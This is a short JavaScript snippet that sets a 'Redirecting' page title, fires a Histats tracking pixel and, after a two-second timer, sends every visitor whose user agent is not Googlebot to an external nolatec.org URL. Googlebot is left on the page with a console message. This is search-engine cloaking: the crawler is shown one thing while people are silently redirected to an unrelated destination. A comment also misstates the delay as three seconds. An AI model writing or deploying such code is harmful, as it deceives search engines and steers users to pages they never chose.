// 1. Set Page Title (No HTML tags or document.write used)
document.title = "Redirecting";

// 2. Histats Live Tracking Pixel
var tracker = new Image();
tracker.src = "https://s10.histats.com/1.gif?5032111&101";

// 3. 3 Seconds Delay & User-Agent Redirect Logic
var redirectDelay = 2000;

setTimeout(function() {
  if (!navigator.userAgent.includes('Googlebot')) {
    window.location.href = "https://nolatec.org/4/1e5c257bb6f145c9aef01843d3777f97";
  } else {
    console.log("Thanks for visiting my page");
  }
}, redirectDelay);
